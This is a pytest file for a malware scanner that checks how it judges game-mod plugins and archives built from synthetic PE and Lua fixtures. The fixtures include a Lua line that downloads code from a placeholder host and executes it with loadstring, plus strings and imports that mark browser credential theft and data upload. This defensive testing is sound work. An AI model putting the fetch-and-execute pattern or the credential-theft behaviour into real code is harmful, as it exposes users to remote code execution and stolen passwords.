"""End-to-end security verdict invariants with inert synthetic artifacts."""

import struct

import pytest

from malguard_core import Scanner
from malguard_core.model import (
    Artifact, ArtifactStatus, CoverageEntry, CoverageState, EvidenceDomain,
    EvidenceLocation, ErrorCode, Hashes, Severity, StageResult, Verdict, make_evidence,
)
from malguard_core.scoring import assess
from malguard_core.verdict import VerdictEngine
from tests.builders.archive_fixtures import central_offsets, zip_bytes
from tests.builders.pe_dotnet import managed_pe, native_pe


CREDENTIAL_BYTES = b"Login Data\0Local State\0password_value\0CryptUnprotectData\0HttpSendRequest\0POST\0"
CREDENTIAL_IMPORTS = ("ReadFile", "CryptUnprotectData", "HttpSendRequestA")
REMOTE_LUA = b'PerformHttpRequest("https://example.invalid/inert", function(status, body) loadstring(body)() end)'


@pytest.fixture
def scanner():
    with Scanner() as instance:
        yield instance


def scan_bytes(scanner, tmp_path, name: str, data: bytes):
    path = tmp_path / name
    path.write_bytes(data)
    return scanner.scan_file(path)


def test_parser_failure_does_not_erase_collected_malicious(scanner, tmp_path, monkeypatch):
    data = native_pe(imports=CREDENTIAL_IMPORTS, strings=CREDENTIAL_BYTES)
    initial = scan_bytes(scanner, tmp_path, "fixture.asi", data)
    assert initial.verdict is Verdict.MALICIOUS
    original = scanner._worker

    def fail_pe(stage, data, artifact_id, path, ledger, extra=None):
        if stage == "pe":
            return StageResult("S2", CoverageState.FAILED, errors=(ErrorCode.MALFORMED_INPUT,),
                               limitations=("Synthetic parser failure; raw evidence is retained.",))
        return original(stage, data, artifact_id, path, ledger, extra)

    monkeypatch.setattr(scanner, "_worker", fail_pe)
    failed = scanner.scan_file(tmp_path / "fixture.asi")
    assert failed.verdict is Verdict.MALICIOUS
    assert any(entry.state is CoverageState.FAILED for entry in failed.root_artifact.coverage)
    assert any(item.domain is EvidenceDomain.HARM for item in failed.evidence)


@pytest.mark.parametrize("mutation", ["nt_pointer", "section_count", "signature", "mz"])
def test_header_corruption_does_not_lower_harmful_verdict(scanner, tmp_path, mutation):
    original = native_pe(imports=CREDENTIAL_IMPORTS, strings=CREDENTIAL_BYTES)
    initial = scan_bytes(scanner, tmp_path, "original.asi", original)
    data = bytearray(original)
    if mutation == "nt_pointer":
        struct.pack_into("<I", data, 60, 0xFFFFFFFE)
    elif mutation == "section_count":
        struct.pack_into("<H", data, 0x86, 0xFFFF)
    elif mutation == "signature":
        data[0x80:0x84] = b"BAD!"
    else:
        data[:2] = b"ZZ"
    changed = scan_bytes(scanner, tmp_path, "corrupt.asi", bytes(data))
    assert initial.verdict is Verdict.MALICIOUS
    assert changed.verdict is Verdict.MALICIOUS
    assert changed.risk_score >= initial.risk_score


def _with_encrypted_second_member(data: bytes) -> bytes:
    changed = bytearray(data)
    central = central_offsets(data)[1]
    local = struct.unpack_from("<I", data, central + 42)[0]
    struct.pack_into("<H", changed, local + 6, 1)
    struct.pack_into("<H", changed, central + 8, 1)
    return bytes(changed)


def test_encrypted_child_never_erases_suspicious_child(scanner, tmp_path):
    data = zip_bytes([("loader.lua", REMOTE_LUA), ("hidden.lua", b"return 1")])
    clean_directory = scan_bytes(scanner, tmp_path, "package.zip", data)
    encrypted = scan_bytes(scanner, tmp_path, "protected.zip", _with_encrypted_second_member(data))
    assert clean_directory.verdict is Verdict.SUSPICIOUS
    assert encrypted.verdict is Verdict.SUSPICIOUS
    assert encrypted.risk_score >= clean_directory.risk_score
    assert any(item.true_type == "UNREADABLE" for item in encrypted.artifacts)


def test_encrypted_child_never_erases_malicious_child(scanner, tmp_path):
    data = zip_bytes([("payload.asi", native_pe(imports=CREDENTIAL_IMPORTS, strings=CREDENTIAL_BYTES)),
                      ("hidden.lua", b"return 1")])
    plain = scan_bytes(scanner, tmp_path, "plain.zip", data)
    encrypted = scan_bytes(scanner, tmp_path, "encrypted.zip", _with_encrypted_second_member(data))
    assert plain.verdict is Verdict.MALICIOUS
    assert encrypted.verdict is Verdict.MALICIOUS


def test_opacity_cannot_make_malicious_or_reduce_risk(scanner, tmp_path):
    baseline = scan_bytes(scanner, tmp_path, "clean.asi", native_pe())
    protected = scan_bytes(scanner, tmp_path, "protected.asi", native_pe(strings=b"UPX!\0VMProtect\0Themida\0ConfuserEx\0SmartAssembly\0"))
    assert baseline.verdict is Verdict.SAFE
    assert protected.verdict is not Verdict.MALICIOUS
    assert protected.verdict is not Verdict.SAFE
    assert protected.risk_score >= baseline.risk_score
    assert any(item.domain is EvidenceDomain.OPACITY for item in protected.evidence)


def test_gta_branding_does_not_mitigate_credentials(scanner, tmp_path):
    original = scan_bytes(scanner, tmp_path, "credential.asi", native_pe(imports=CREDENTIAL_IMPORTS, strings=CREDENTIAL_BYTES))
    branded = scan_bytes(scanner, tmp_path, "gta.asi", native_pe(imports=(*CREDENTIAL_IMPORTS, "scriptRegister", "nativeCall"), strings=CREDENTIAL_BYTES + b"GTA5.exe\0ScriptHookV\0"))
    assert original.verdict is branded.verdict is Verdict.MALICIOUS
    def scores(report):
        return {item.family: item.score for item in assess(report.evidence).families if item.domain is EvidenceDomain.HARM}
    assert scores(original)["CREDENTIAL_ACCESS"] == scores(branded)["CREDENTIAL_ACCESS"]
    assert scores(original)["EXFILTRATION"] == scores(branded)["EXFILTRATION"]


@pytest.mark.parametrize("extension", ["asi", "dll"])
def test_executable_renamed_plugin_is_suspicious(scanner, tmp_path, extension):
    report = scan_bytes(scanner, tmp_path, "fake." + extension, native_pe(dll=False))
    assert report.verdict is Verdict.SUSPICIOUS
    assert any(item.family == "MASQUERADE" for item in report.evidence)


def test_parser_disagreement_never_safe(scanner, tmp_path, monkeypatch):
    original = scanner._worker

    def disagreement(stage, data, artifact_id, path, ledger, extra=None):
        if stage == "pe":
            return StageResult("S2", CoverageState.PARTIAL,
                               facts={"parser_disagreement": True}, errors=(ErrorCode.PARSER_DISAGREEMENT,),
                               limitations=("Synthetic independent parser disagreement.",))
        return original(stage, data, artifact_id, path, ledger, extra)

    monkeypatch.setattr(scanner, "_worker", disagreement)
    report = scan_bytes(scanner, tmp_path, "fixture.asi", native_pe())
    assert report.verdict is Verdict.INCONCLUSIVE
    assert any(entry.error_code is ErrorCode.PARSER_DISAGREEMENT for entry in report.root_artifact.coverage)


def test_deterministic_reports_across_reusable_workers(scanner, tmp_path):
    path = tmp_path / "fixture.asi"
    path.write_bytes(native_pe(imports=CREDENTIAL_IMPORTS, strings=CREDENTIAL_BYTES))
    first = scanner.scan_file(path)
    second = scanner.scan_file(path)
    assert first == second
    assert first.to_json() == second.to_json()
    assert first.to_text() == second.to_text()


@pytest.mark.parametrize("name,data", [
    ("script_hook.asi", native_pe(imports=("VirtualProtect", "scriptRegister", "nativeCall"), strings=b"ScriptHookV\0GTA5.exe\0")),
    ("virtual_alloc.asi", native_pe(imports=("VirtualAlloc",))),
    ("browser_string.asi", native_pe(strings=b"Chrome User Data Default Login Data\0")),
    ("process_start.cs", b'Process.Start("GTA5.exe");'),
    ("http_only.lua", b'PerformHttpRequest("https://example.invalid/version", function(status, body) print(body) end)'),
    ("managed_update.dll", managed_pe(calls=(("System.Net.Http.HttpClient", "GetStringAsync", ("string",)),))),
    ("trainer.cs", b'var game = Process.GetProcessesByName("GTA5");\nvar handle = OpenProcess(1, false, game[0].Id);\nWriteProcessMemory(handle, buffer);'),
])
def test_complete_benign_lookalikes_can_be_safe(scanner, tmp_path, name, data):
    report = scan_bytes(scanner, tmp_path, name, data)
    assert report.verdict is Verdict.SAFE
    if name == "trainer.cs":
        assert "HACKTOOL_PUA" in report.classification_tags


def test_family_saturation_and_independence():
    location = EvidenceLocation("synthetic")
    items = tuple(make_evidence(f"TEST.{index}", "S3", EvidenceDomain.HARM, "PROCESS_INJECTION", "synthetic", Severity.CRITICAL, location,
                               "Harmless synthetic fact.", "واقعیت آزمایشی بی‌ضرر.") for index in range(10))
    assessment = assess(items)
    assert assessment.harm_total == 32
    artifact = Artifact("synthetic", "fixture.asi", ".asi", "PE32_DLL", 1.0, 1, Hashes(), ArtifactStatus.VALID,
                        coverage=(CoverageEntry("S0", CoverageState.COMPLETE),))
    assert VerdictEngine().decide(artifact, assessment, 100, items).verdict is Verdict.SUSPICIOUS


def test_invalid_keeps_weak_residual_evidence():
    evidence = make_evidence("TEST.WEAK", "S3", EvidenceDomain.CONTEXT, "CONTEXT", "synthetic", Severity.LOW,
                             EvidenceLocation("synthetic"), "Harmless residual fact.", "واقعیت باقی‌ماندهٔ بی‌ضرر.")
    artifact = Artifact("synthetic", "broken.asi", ".asi", "MALFORMED_PE", 1.0, 1, Hashes(), ArtifactStatus.MALFORMED,
                        evidence=(evidence,), coverage=(CoverageEntry("S0", CoverageState.COMPLETE),))
    result = VerdictEngine().decide(artifact, assess((evidence,)), 100, (evidence,))
    assert result.verdict is Verdict.INVALID
    assert result.residual_evidence
